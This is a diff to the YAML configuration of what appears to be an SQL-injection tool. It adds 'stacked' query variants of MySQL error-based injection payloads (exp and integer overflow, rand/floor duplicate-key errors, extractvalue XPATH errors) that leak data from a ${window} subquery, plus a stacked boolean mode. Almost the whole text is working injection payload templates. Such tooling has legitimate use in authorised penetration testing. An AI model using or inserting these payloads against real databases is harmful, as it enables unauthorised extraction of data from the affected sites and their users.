@@ -281,6 +281,8 @@ strategy:
    )
   orderBy: order by 1337
 
+ stacked: ; select ${window}
+
  boolean:
   test:
    bit: |
@@ -295,6 +297,7 @@ strategy:
    length: char_length(${injection}) > ${window.char}
   modeAnd: and
   modeOr: or
+  modeStacked: ; select 'stacked' where
   blind: ${boolean.mode} ${test}
   time: |
    ${boolean.mode} if(
@@ -366,6 +369,16 @@ strategy:
       ) or '
      capacity: 453
 
+   - name: Unsigned:stacked
+     query: |
+      ; select !(
+          select *
+          from (
+              ${window}
+          ) x
+      )-~0
+     capacity: 453
+
    - name: OverDouble:or
      query: |
       /* Data truncation: DOUBLE value is out of range in '<sqli>' */
@@ -431,6 +444,18 @@ strategy:
               )
           )
       ) or '
+     capacity: 462
+
+   - name: OverDouble:stacked
+     query: |
+      ; select exp(
+          ~(
+              select *
+              from (
+                  ${window}
+              ) x
+          )
+      )
      capacity: 462
 
    - name: Rand:or
@@ -520,10 +545,25 @@ strategy:
       ) or '
      capacity: 64
 
-   # extractvalue() interpreted whatever :OR :AND
+   - name: Rand:stacked
+     query: |
+      ; select 1 from (
+          select
+              count(*),
+              concat(
+                  (
+                      ${window}
+                  ),
+                  floor(rand(0)*2)
+              )
+          from information_schema.tables
+          group by 2
+      ) x
+     capacity: 64
+
    - name: Extractvalue
      query: |
-      /* XPATH syntax error: '<sqli>' */
+      /* XPATH syntax error: '<sqli>', whatever mode OR AND stacked */
       or 1 = extractvalue(
           0x0a,
           concat(
@@ -550,7 +590,6 @@ strategy:
       )
      capacity: 31
 
-   # extractvalue() interpreted whatever :OR :AND
    - name: Extractvalue:crud
      query: |
       ' or (
@@ -564,6 +603,19 @@ strategy:
               )
           )
       ) or '
+     capacity: 31
+
+   - name: Extractvalue:stacked
+     query: |
+      ; select extractvalue(
+          0x0a,
+          concat(
+              0x0a,
+              (
+                  ${window}
+              )
+          )
+      )
      capacity: 31
 
    - name: OverInt:or
@@ -640,4 +692,17 @@ strategy:
               4611686018427387904
           )
       ) or '
+     capacity: 460
+
+   - name: OverInt:stacked
+     query: |
+      ; select 2*if(
+          (
+              select * from (
+                  ${window}
+              )x
+          ), 
+          4611686018427387904, 
+          4611686018427387904
+      )
      capacity: 460
